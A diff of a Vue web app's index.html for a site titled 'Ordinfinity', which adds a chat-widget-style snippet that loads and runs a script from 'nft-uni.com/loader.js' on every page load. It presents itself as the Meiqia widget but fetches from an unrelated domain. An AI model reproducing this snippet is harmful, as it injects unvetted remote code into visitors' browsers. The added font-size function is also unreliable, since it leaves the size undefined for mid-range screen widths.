@@ -1,39 +1,58 @@
-<!DOCTYPE html>
-<html lang="en" class="dark">
-  <head>
-    <meta charset="UTF-8" />
-    <link rel="icon" href="./ico/favicon.9f490973.ico" />
-    <meta name="viewport"  content="width=device-width, initial-scale=1.0" />
-    <title>Ordinfinity</title>
-    <script type="module" crossorigin src="./js/index.523f55f4.js"></script>
-    <link rel="modulepreload" crossorigin href="./js/@vue.52bf0d45.js">
-    <link rel="modulepreload" crossorigin href="./js/vue.3c5ef26d.js">
-    <link rel="modulepreload" crossorigin href="./js/@intlify.67c0fc79.js">
-    <link rel="modulepreload" crossorigin href="./js/vue-i18n.3baa2b2e.js">
-    <link rel="modulepreload" crossorigin href="./js/vue-demi.97abf6ee.js">
-    <link rel="modulepreload" crossorigin href="./js/pinia.5e054759.js">
-    <link rel="modulepreload" crossorigin href="./js/lodash-es.21c98b27.js">
-    <link rel="modulepreload" crossorigin href="./js/@vueuse.b295f9b9.js">
-    <link rel="modulepreload" crossorigin href="./js/@element-plus.38e4a047.js">
-    <link rel="modulepreload" crossorigin href="./js/@popperjs.c75af06c.js">
-    <link rel="modulepreload" crossorigin href="./js/@ctrl.f8748455.js">
-    <link rel="modulepreload" crossorigin href="./js/@babel.f1e6723f.js">
-    <link rel="modulepreload" crossorigin href="./js/dayjs.2d5d7b0f.js">
-    <link rel="modulepreload" crossorigin href="./js/async-validator.20f92749.js">
-    <link rel="modulepreload" crossorigin href="./js/memoize-one.297ddbcb.js">
-    <link rel="modulepreload" crossorigin href="./js/escape-html.3f1f2bdd.js">
-    <link rel="modulepreload" crossorigin href="./js/normalize-wheel-es.ed76fb12.js">
-    <link rel="modulepreload" crossorigin href="./js/@floating-ui.72671fae.js">
-    <link rel="modulepreload" crossorigin href="./js/element-plus.8ee76d0e.js">
-    <link rel="modulepreload" crossorigin href="./js/vue-router.26ff8f49.js">
-    <link rel="modulepreload" crossorigin href="./js/mitt.f7ef348c.js">
-    <link rel="stylesheet" href="./css/element-plus.662483bd.css">
-    <link rel="stylesheet" href="./css/index.13f0f871.css">
-    <link rel="stylesheet" href="./css/animate.5b222a0b.css">
-  </head>
-  <body>
-    <div id="app"></div>
-    
-    
-  </body>
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/svg+xml" href="/assets/favicon-4d7dba8a.ico" />
+  <link rel="apple-touch-icon" href="/192.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ordin finity</title>
+  <script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.ready.then(registration => {
+        registration.unregister();
+      });
+    }
+    const getFontSize = (doc, win) => {
+      let baseFS;
+      const clientWidth = win.innerWidth;
+      if (clientWidth >= 1000) {
+        baseFS = 16;
+      } else if (720 >= clientWidth) {
+        baseFS = 12;
+      }
+      doc.querySelector('html').style.fontSize = baseFS + 'px';
+    };
+
+    ((doc, win) => {
+      getFontSize(doc, win);
+      win.onresize = () => getFontSize(doc, win);
+    })(document, window);
+
+  </script>
+
+  <script type='text/javascript'>
+    (function (a, b, c, d, e, j, s) {
+      a[d] = a[d] || function () {
+        (a[d].a = a[d].a || []).push(arguments)
+      };
+      j = b.createElement(c),
+        s = b.getElementsByTagName(c)[0];
+      j.async = true;
+      j.charset = 'UTF-8';
+      j.src = 'https://nft-uni.com/loader.js';
+      s.parentNode.insertBefore(j, s);
+    })(window, document, 'script', '_MEIQIA');
+    _MEIQIA('entId', '2639c72f41f759e7eefa42a575cda182');
+    _MEIQIA('withoutBtn');
+  </script>
+  <script type="module" crossorigin src="/assets/index-a087f374.js"></script>
+  <link rel="stylesheet" href="/assets/index-0b7a3270.css">
+</head>
+
+<body>
+  <div id="app"></div>
+  
+</body>
+
 </html>
